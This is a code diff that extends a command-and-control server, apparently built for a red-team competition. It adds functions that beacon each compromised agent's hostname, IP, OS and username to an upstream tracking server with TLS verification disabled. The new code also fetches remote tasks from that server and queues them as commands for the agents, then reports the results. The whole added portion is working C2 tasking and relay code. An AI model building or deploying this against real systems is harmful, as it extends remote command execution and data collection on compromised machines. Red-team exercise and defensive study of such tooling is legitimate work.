@@ -12,6 +12,165 @@ commands = {}   # agent_id -> pending command string
 results  = {}   # agent_id -> list of result dicts
 lock     = threading.Lock()
 
+#####################
+# Whackamole Funcs
+#####################
+
+import urllib, ssl, time
+
+SERVER_URL="https://127.0.0.1:8000/"
+AGENT_TYPE="sohan_c2"
+AUTH_TOKEN="abc_123"
+AUTH_TOKEN_DEFAULT="abc_123"
+AUTH_TOKEN_LOCK = threading.Lock()
+
+# Allow connection to the server (uses a self signed cert)
+CTX = ssl.create_default_context()
+CTX.check_hostname = False
+CTX.verify_mode = ssl.CERT_NONE
+
+def print_debug(message):
+    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
+    # For example, if you have a DEBUG flag set, then print to console/logfile.
+    # Otherwise (full deploy for comp), suppress output.
+    #print(message)
+    pass
+
+def send_message(agent_id,endpoint,message="",oldStatus=True,newStatus=True,server_timeout=5):
+    """
+    Sends the specified data to the server.
+    Handles the full process and attaching agent name/auth/system details.
+
+    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
+    Returns: status(Bool)
+    """
+    global AUTH_TOKEN
+    if not SERVER_URL:
+        # Server comms are intentionally disabled (server_url is an empty string)
+        # Maybe redirect to print_debug instead?
+        return False, "no SERVER_URL value specified"
+
+    try:
+        url = SERVER_URL + endpoint
+
+        # Prep payload
+        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
+        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
+        # assembly logic of the payload, so we attach the same data to every communication.
+        with lock:
+            payload = {
+                "name": f"agent_{agent_id}",
+                "hostname": agents[agent_id]["hostname"],
+                "ip": agents[agent_id]["ip"],
+                "os": agents[agent_id]["os"],
+                "executionUser": agents[agent_id]["username"],
+                "executionAdmin": True,
+                "auth": AUTH_TOKEN,
+                "agent_type": AGENT_TYPE,
+                "oldStatus": oldStatus,
+                "newStatus": newStatus,
+                "message": message
+            }
+
+        # Prepare data as JSON for transmit
+        data = json.dumps(payload).encode("utf-8")
+
+        # Build request
+        req = urllib.request.Request(
+            url,
+            data=data,
+            headers={"Content-Type": "application/json"},
+            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
+        )
+
+        # Send payload
+        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
+            if response.getcode() == 200:
+                # Good result! Now parse and return the endpoint
+                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
+                response_text = response.read().decode('utf-8')
+                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
+                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
+                if "agent/beacon" in endpoint:
+                    if AUTH_TOKEN == AUTH_TOKEN_DEFAULT:
+                        if response_text != AUTH_TOKEN:
+                            with AUTH_TOKEN_LOCK:
+                                AUTH_TOKEN = response_text
+                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
+                return True, response_text
+            else:
+                print_debug(f"send_message({url}): Server error: {response.getcode()}")
+
+    # Error handling
+    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
+    except urllib.error.HTTPError as e:
+        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
+    except urllib.error.URLError as e:
+        print_debug(f"send_message({url}): URL error: {e.reason}")
+    except Exception as e:
+        print_debug(f"send_message({url}): Beacon error: {e}")
+    return False, ""
+
+def pwnboard_agent(agent_id):
+    # Handles keepalives and tasking for a single agent for a single iteration. Should be ran threaded.
+    # Only checks for a single command each iteration.
+    status, response = send_message(agent_id,"agent/beacon","keepalive")
+
+    # Only get a task from the server if the client doesn't already have one queued (prioritize local server)
+    ready = False
+    with lock:
+        if not commands.get(agent_id):
+            ready = True
+
+    if ready:
+        status, response = send_message(agent_id,"agent/get_task")
+        if status: # Check that communication was successful
+            if response != "no pending tasks":
+                # We have a task waiting! Let's decode it (see API spec document):
+                data = json.loads(response)
+                task_id = data.get('task_id')
+                task_command = data.get('task')
+                try:
+                    with lock:
+                        commands[agent_id] = task_command
+                    result = "Queued command for execution by subordinate C2 server"
+                except Exception as E:
+                    # Always account for weird errors (or a simple timeout) when you least expect it!
+                    # Don't leave the server hanging:
+                    print_debug(f"subprocess exception: {E}")
+                    result = f"unexpected exception when trying to execute task: {str(E)[:100]}" # truncate in case it's really big
+                finally:
+                    # Now, we'll send the result back to the server
+                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':')) # specify separators to compact whitespace
+                    status, response = send_message(agent_id,"agent/set_task_result",message=resultjson)
+
+def pwnboard_loop():
+    # Spawns keepalive/task threads
+    while True:
+        active_agents = []
+        time_now = datetime.datetime.now()
+        with lock:
+            # 3. Iterate through the dictionary
+            for id in agents:
+                if (time_now - datetime.datetime.fromisoformat(agents[id]["last_seen"])).total_seconds() < 60:
+                    active_agents.append(id)
+        
+        threads = []
+        for agent_id in active_agents:
+            # Create a dedicated thread for this specific agent's turn and run them simultaneously
+            t = threading.Thread(target=pwnboard_agent, args=(agent_id,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        # wait for all agent threads to finish to avoid threat overload if one is hanging too much
+        # for t in threads:
+        #     t.join(timeout=10) # Wait up to 10 seconds per thread
+
+        time.sleep(60) # wait for next iteration
+
+#####################
+# End Whackamole Funcs
+##################### 
 
 def route(path, method):
     patterns = {
@@ -106,6 +265,7 @@ class Handler(BaseHTTPRequestHandler):
                 "ip":        self.client_address[0],
             }
         print(f"[+] New agent: {aid}  host={agents[aid]['hostname']}  user={agents[aid]['username']}")
+        status, response = send_message(aid,"agent/beacon","register")
         self.send_json({"status": "ok"})
 
     def handle_get_cmd(self, agent_id):
@@ -161,6 +321,8 @@ if __name__ == "__main__":
     server = HTTPServer(("0.0.0.0", PORT), Handler)
     server.socket.settimeout(1)   # lets KeyboardInterrupt work cleanly
     print(f"[*] C2 server (no-dep) listening on 0.0.0.0:{PORT}")
+    pwnboard_loop_thread = threading.Thread(target=pwnboard_loop, args=(), daemon=True)
+    pwnboard_loop_thread.start()
     try:
         server.serve_forever()
     except KeyboardInterrupt:
